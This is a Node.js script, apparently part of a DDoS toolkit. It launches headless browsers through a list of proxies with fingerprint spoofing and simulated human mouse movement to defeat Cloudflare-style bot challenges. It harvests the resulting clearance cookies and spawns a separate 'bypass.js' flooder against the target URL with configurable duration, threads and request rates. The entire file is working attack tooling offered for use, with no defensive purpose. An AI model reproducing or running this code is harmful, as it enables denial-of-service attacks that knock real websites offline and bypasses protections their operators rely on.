const fs = require("fs");
const puppeteer = require("puppeteer-extra");
const StealthPlugin = require("puppeteer-extra-plugin-stealth");
const async = require("async");
const { spawn } = require("child_process");
const chalk = require('chalk');

puppeteer.use(StealthPlugin());

if (process.argv.length < 8) {
  console.log(chalk.red('Usage: node capcha.js <targetURL> <duration> <threads> <thread> <rates> <proxyFile>'));
  process.exit(1);
}

const targetURL = process.argv[2];
const duration = parseInt(process.argv[3]);
const threads = parseInt(process.argv[4]);
const thread = parseInt(process.argv[5]);
const rates = process.argv[6];
const proxyFile = process.argv[7];

const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));

const proxies = fs.readFileSync(proxyFile, 'utf8')
  .trim()
  .split(/\r?\n/)
  .filter(line => line.trim() && /^[\w\.-]+:\d+/.test(line.trim())); // Hỗ trợ cả ip:port và ip:port:user:pass

// Mobile User Agents mới nhất 2026
const userAgents = [
  `Mozilla/5.0 (Linux; Android 14; SM-S928U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36`,
  `Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36`,
  `Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36`,
  `Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1`,
  `Mozilla/5.0 (Linux; Android 14; 23127PN0CG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36`,
  `Mozilla/5.0 (Linux; Android 13; ASUS_AI2401) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36`,
  `Mozilla/5.0 (Linux; Android 14; CPH2551) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36`
];

function randomElement(arr) {
  return arr[Math.floor(Math.random() * arr.length)];
}

const colors = {
  green: (text) => chalk.green(text),
  magenta: (text) => chalk.magenta(text)
};

let totalCookies = 0;

// Spoof fingerprint nâng cao + canvas noise
async function spoofFingerprint(page) {
  await page.evaluateOnNewDocument(() => {
    const screenWidth = 360 + Math.floor(Math.random() * 120);
    const screenHeight = 640 + Math.floor(Math.random() * 240);
    Object.defineProperty(window, 'screen', {
      value: { width: screenWidth, height: screenHeight, availWidth: screenWidth, availHeight: screenHeight, colorDepth: 24, pixelDepth: 24 },
      writable: false
    });

    Object.defineProperty(navigator, 'platform', { value: 'Linux aarch64', writable: false });
    Object.defineProperty(window, 'devicePixelRatio', { value: 2.5 + Math.random() * 0.75, writable: false });

    // Canvas noise
    const originalToDataURL = HTMLCanvasElement.prototype.toDataURL;
    HTMLCanvasElement.prototype.toDataURL = function() {
      const ctx = this.getContext('2d');
      if (ctx) {
        ctx.fillStyle = `#${Math.random().toString(16).slice(2, 8)}`;
        ctx.fillRect(0, 0, 8, 8);
      }
      return originalToDataURL.apply(this, arguments);
    };
  });
}

// Human-like mouse movement phức tạp (từ browser.js + tối ưu)
async function simulateHumanMouseMovement(page, element, options = {}) {
  const { 
    minMoves = 10, maxMoves = 25, minDelay = 50, maxDelay = 200,
    jitterFactor = 0.25, overshootChance = 0.5, hesitationChance = 0.4, finalDelay = 1200 
  } = options;

  const bbox = await element.boundingBox();
  if (!bbox) return;

  const targetX = bbox.x + bbox.width / 2;
  const targetY = bbox.y + bbox.height / 2;

  const { width, height } = await page.evaluate(() => ({ width: window.innerWidth, height: window.innerHeight }));

  let currentX = Math.random() * width;
  let currentY = Math.random() * height;

  const moves = Math.floor(Math.random() * (maxMoves - minMoves + 1)) + minMoves;

  for (let i = 0; i < moves; i++) {
    const progress = i / (moves - 1);
    let nextX = currentX + (targetX - currentX) * progress;
    let nextY = currentY + (targetY - currentY) * progress;

    nextX += (Math.random() * 2 - 1) * jitterFactor * bbox.width;
    nextY += (Math.random() * 2 - 1) * jitterFactor * bbox.height;

    if (Math.random() < overshootChance && i < moves - 1) {
      nextX += (Math.random() * 0.5 + 0.5) * (nextX - currentX);
      nextY += (Math.random() * 0.5 + 0.5) * (nextY - currentY);
    }

    await page.mouse.move(nextX, nextY, { steps: 15 });
    await sleep(Math.random() * (maxDelay - minDelay) + minDelay);

    if (Math.random() < hesitationChance) {
      await sleep(Math.random() * (maxDelay - minDelay) * 5 + minDelay * 5);
    }

    currentX = nextX;
    currentY = nextY;
  }

  await page.mouse.move(targetX, targetY, { steps: 8 });
  await sleep(finalDelay);
}

// Human-like scrolling
async function simulateHumanScrolling(page, distance, options = {}) {
  const { minSteps = 8, maxSteps = 20, minDelay = 50, maxDelay = 200, direction = 'down', pauseChance = 0.3 } = options;
  const directionMultiplier = direction === 'up' ? -1 : 1;
  const steps = Math.floor(Math.random() * (maxSteps - minSteps + 1)) + minSteps;
  const baseStepSize = distance / steps;
  let totalScrolled = 0;

  for (let i = 0; i < steps; i++) {
    const stepSize = Math.round(baseStepSize + baseStepSize * 0.2 * (Math.random() * 2 - 1)) * directionMultiplier;
    await page.evaluate(s => window.scrollBy(0, s), stepSize);
    totalScrolled += stepSize;
    await sleep(Math.random() * (maxDelay - minDelay) + minDelay);
    if (Math.random() < pauseChance) await sleep(Math.random() * 2000 + 1000);
  }
}

async function simulateNaturalPageBehavior(page) {
  const { scrollHeight, height } = await page.evaluate(() => ({ scrollHeight: document.documentElement.scrollHeight, height: window.innerHeight }));
  const scrollAmount = Math.floor(scrollHeight * (0.3 + Math.random() * 0.5));
  await simulateHumanScrolling(page, scrollAmount);
  await sleep(1500 + Math.random() * 3000);
  if (Math.random() > 0.4) await simulateHumanScrolling(page, scrollAmount / 3, { direction: 'up' });
}

async function launchBrowser(proxy) {
  const userAgent = randomElement(userAgents);
  const solveStart = Date.now();

  console.log(`${colors.magenta('Js/Browser')} ➝ Start chrome with proxy: ${colors.magenta(proxy)}`);

  // Parse proxy (hỗ trợ ip:port:user:pass)
  let proxyServer = proxy;
  let proxyAuth = null;
  if (proxy.split(':').length === 4) {
    const parts = proxy.split(':');
    proxyServer = `${parts[0]}:${parts[1]}`;
    proxyAuth = { username: parts[2], password: parts[3] };
  }

  const browser = await puppeteer.launch({
    headless: "new", // Headless mới nhất 2026
    args: [
      `--proxy-server=${proxyServer}`,
      `--user-agent=${userAgent}`,
      '--no-sandbox',
      '--disable-setuid-sandbox',
      '--disable-dev-shm-usage',
      '--no-zygote',
      '--window-size=360,640',
      '--disable-gpu',
      '--disable-accelerated-2d-canvas',
      '--disable-background-timer-throttling',
      '--disable-backgrounding-occluded-windows',
      '--disable-renderer-backgrounding',
      '--disable-features=ImprovedCookieControls,LazyFrameLoading,GlobalMediaControls,IsolateOrigins,site-per-process',
      '--disable-blink-features=AutomationControlled',
      '--ignore-certificate-errors',
      '--ignore-ssl-errors',
      '--enable-quic',
      '--enable-features=PostQuantumKyber,NetworkService,NetworkServiceInProcess',
      '--disable-web-security',
      '--allow-running-insecure-content',
      '--disable-infobars'
    ],
    defaultViewport: { width: 360, height: 640, deviceScaleFactor: 3, isMobile: true, hasTouch: Math.random() < 0.7 }
  });

  const page = (await browser.pages())[0];
  await spoofFingerprint(page);

  if (proxyAuth) {
    await page.authenticate(proxyAuth); // Ẩn IP hoàn toàn, tránh leak
  }

  page.setDefaultNavigationTimeout(60000);
  await page.goto(targetURL, { waitUntil: "domcontentloaded" });
  await simulateNaturalPageBehavior(page);

  let attempts = 0;
  const maxAttempts = 5;
  let solveTime = 0;

  while (attempts < maxAttempts) {
    const content = await page.content();
    const title = await page.title();

    if (content.includes("challenge-platform") || content.includes("Just a moment...")) {
      await sleep(5000 + Math.random() * 8000);

      const captchaBox = await page.$('body > div.main-wrapper > div > div > div > div');
      if (captchaBox) {
        await simulateHumanMouseMovement(page, captchaBox, {
          minMoves: 12,
          maxMoves: 28,
          minDelay: 60,
          maxDelay: 220,
          jitterFactor: 0.3,
          overshootChance: 0.6,
          hesitationChance: 0.5,
          finalDelay: 1500
        });
        await captchaBox.click();

        // Chờ challenge disappear chính xác
        await page.waitForFunction(
          () => !document.querySelector('body > div.main-wrapper > div > div > div > div'),
          { timeout: 45000 }
        ).catch(() => {});
      }
    }

    const cookies = await page.cookies(targetURL);
    if (cookies.length > 0) {
      const cookieString = cookies.map(c => `${c.name}=${c.value}`).join("; ");
      totalCookies++;

      console.log(`{`);
      console.log(`   ${chalk.black.bold.bgWhite('pageTitle')}: ${colors.green(title)}`);
      console.log(`   ${chalk.black.bold.bgWhite('proxyAddress')}: ${colors.green(proxy)}`);
      console.log(`   ${chalk.black.bold.bgWhite('userAgent')}: ${colors.green(userAgent)}`);
      console.log(`   ${chalk.black.bold.bgWhite('cookieFound')}: ${colors.green(cookieString)}`);
      console.log(`   ${chalk.black.bold.bgWhite('Time_Solver')}: ${colors.green(`${((Date.now() - solveStart) / 1000).toFixed(2)}s`)}`);
      console.log(`   ${chalk.black.bold.bgWhite('Total_Cookies')}: ${colors.green(totalCookies)}`);
      console.log(`},`);

      await browser.close();
      return { cookies: cookieString, proxy, userAgent };
    }

    attempts++;
    await sleep(5000);
  }

  await browser.close();
  return null;
}

async function worker(task, done) {
  try {
    const result = await launchBrowser(task.proxy);
    if (result) {
      spawn("node", ["bypass.js", "GET", targetURL, duration, thread, rates, result.proxy, result.cookies, result.userAgent], { stdio: 'inherit' });
    }
  } catch (e) {
    console.error(chalk.red(e));
  }
  done();
}

const queue = async.queue(worker, threads);

proxies.forEach(proxy => queue.push({ proxy }));

queue.drain(() => {
  console.log(colors.green('All proxies processed. Exiting...'));
  process.exit(0);
});

setTimeout(() => {
  queue.kill();
  require('child_process').exec('pkill -f bypass.js');
  require('child_process').exec('pkill -f chrome');
  setTimeout(() => process.exit(0), 5000);
}, duration * 1000);